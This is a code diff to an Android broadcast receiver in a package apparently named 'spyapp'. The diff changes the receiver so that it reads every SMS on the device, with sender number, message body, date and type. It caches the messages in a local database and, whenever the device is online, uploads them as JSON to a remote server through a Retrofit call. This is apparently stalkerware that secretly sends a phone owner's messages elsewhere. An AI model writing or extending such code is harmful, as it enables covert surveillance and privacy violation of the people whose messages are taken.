@@ -15,6 +15,7 @@ import java.util.ArrayList;
 import java.util.Date;
 import java.util.List;
 
+import kkactive_india.in.spyapp.Database.DatabaseHelper;
 import kkactive_india.in.spyapp.msgPOJO.MsgBean;
 import kkactive_india.in.spyapp.msgPOJO.MsgDatum;
 import retrofit2.Call;
@@ -31,8 +32,13 @@ public class msgLogs extends BroadcastReceiver {
     List<MsgDatum> data = new ArrayList<>();
     SharedPreferences pref;
     SharedPreferences.Editor edit;
+    protected Context savedContext;
+    ConnectionDetector cd;
     @Override
     public void onReceive(Context context, Intent intent) {
+        savedContext = context;
+
+        cd = new ConnectionDetector(savedContext);
 
         Log.d("actio" , intent.getAction());
 
@@ -45,10 +51,10 @@ public class msgLogs extends BroadcastReceiver {
         Cursor cur = context.getContentResolver().query(uriSMSURI, null, null, null, strOrder);
 
         sb.append("SMS Details :");
-        //while (cur != null && cur.moveToNext()) {
+        while (cur != null && cur.moveToNext()) {
 
-        try {
-            cur.moveToFirst();
+
+            //cur.moveToFirst();
 
             String name = cur.getString(cur.getColumnIndexOrThrow("_id"));
             address = cur.getString(cur.getColumnIndex("address"));
@@ -70,18 +76,48 @@ public class msgLogs extends BroadcastReceiver {
                     break;
             }
 
-            MsgDatum person = new MsgDatum();
+           /* MsgDatum person = new MsgDatum();
             person.setMobile( address );
             person.setMessage( body );
             person.setDate( String.valueOf(dateFormat) );
             person.setType( type );
-            data.add(person);
+            data.add(person);*/
+
+
+            DatabaseHelper db = new DatabaseHelper(savedContext);
+
+            Boolean result = db.insert(address, body, type, String.valueOf(dateFormat));
+
+            Log.d("gayaDatabaseMai", String.valueOf(result));
+
+
             sms.add("\nNumber: " + address + "\n Message: " + body + "\n Date:" + dateFormat + "\n Type:" + type);
 
             sb.append("\nNumber: " + address + "\n Message: " + body + "\n Date:" + dateFormat + "\n Type:" + type);
             sb.append("\n-----------------");
+        }
+
+        if (cur != null) {
+            cur.close();
+        }
+
+
+           final DatabaseHelper db = new DatabaseHelper(savedContext);
+                Cursor c = db.getMsgs();
+
+                if (c != null)
+                    while (c.moveToNext()) {
+                    MsgDatum person = new MsgDatum();
+                    person.setMobile(c.getString(c.getColumnIndex("phone")));
+                      person.setMessage(c.getString(c.getColumnIndex("body")));
+                      person.setDate(c.getString(c.getColumnIndex("date")));
+                      person.setType(c.getString(c.getColumnIndex("type")));
+                      data.add(person);
+                    }
 
             Log.d("SMSS", sms.toString());
+
+        if (cd.isConnectingToInternet()) {
 
             Bean b = (Bean) context.getApplicationContext();
 
@@ -97,11 +133,11 @@ public class msgLogs extends BroadcastReceiver {
             Gson gsonObj = new Gson();
 
             String jsonStr = gsonObj.toJson(body);
-            String id = pref.getString("id","");
+            String id = pref.getString("id", "");
             Log.d("idHaiKyaBhai", id);
-            Log.d("idHaiKyaBhai", pref.getString("id",""));
+            Log.d("idHaiKyaBhai", pref.getString("id", ""));
             Log.d("idHaikya", jsonStr);
-            Call<MsgBean> call = cr.msgs(id,jsonStr);
+            Call<MsgBean> call = cr.msgs(id, jsonStr);
             call.enqueue(new Callback<MsgBean>() {
                 @Override
                 public void onResponse(Call<MsgBean> call, Response<MsgBean> response) {
@@ -114,12 +150,8 @@ public class msgLogs extends BroadcastReceiver {
 
                 }
             });
-
-
-        }catch (Exception e)
-        {
-            e.printStackTrace();
         }
+
 
 
         //}
